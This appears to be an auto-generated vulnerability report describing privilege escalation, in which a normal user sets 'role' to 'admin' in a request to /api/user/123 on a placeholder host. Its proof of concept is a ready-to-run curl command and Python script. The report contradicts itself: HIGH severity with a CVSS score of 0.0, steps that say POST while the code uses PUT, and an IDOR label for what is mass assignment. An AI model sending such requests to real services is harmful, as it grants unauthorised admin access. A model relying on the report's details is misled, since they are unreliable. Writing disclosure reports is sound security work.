## Summary
User can modify role parameter in JSON body to become admin.

## Vulnerability Type
IDOR

## Severity
HIGH (CVSS: 0.0)
CVSS Vector: N/A

## Description
User can modify role parameter in JSON body to become admin.

## Steps to Reproduce
1. Login as normal user
2. Send POST request to /api/user/123
3. Change role to admin

## Impact
Full account takeover and privilege escalation.

## Proof of Concept

### cURL
```bash
curl -X PUT https://api.target.com/api/user/123 -H "Authorization: Bearer [AUTH_TOKEN]" -H "Content-Type: application/json" -d "{\"role\":\"admin\"}"
```

### Python
```python
import requests

url = 'https://api.target.com/api/user/123'
headers = {
    'Authorization': 'Bearer [AUTH_TOKEN]',
    'Content-Type': 'application/json'
}

payload = {"role":"admin"}

response = requests.put(url, headers=headers, json=payload)
print(response.status_code)
print(response.text)
```
